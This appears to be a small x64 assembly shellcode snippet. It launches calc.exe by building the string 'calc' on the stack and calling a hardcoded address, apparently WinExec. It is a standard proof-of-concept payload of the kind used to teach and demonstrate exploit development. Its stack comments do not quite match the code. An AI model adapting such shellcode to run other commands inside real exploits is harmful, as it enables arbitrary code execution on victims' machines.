; POP calc.exe

section .text
	GLOBAL _start

_start:
	xor rax, rax ; Zero out RAX
	push rax ; \0
	push 0x6578652e ; exe.
	push 0x636c6163 ; clac
	; \0exe.clac push into the stack

	mov rcx, rsp ; lpCmdLine

	mov rdx, 0x1 ; uCmdShow

	sub rsp, 0x20

	mov rax, 0x00007FFB47E98820

	call rax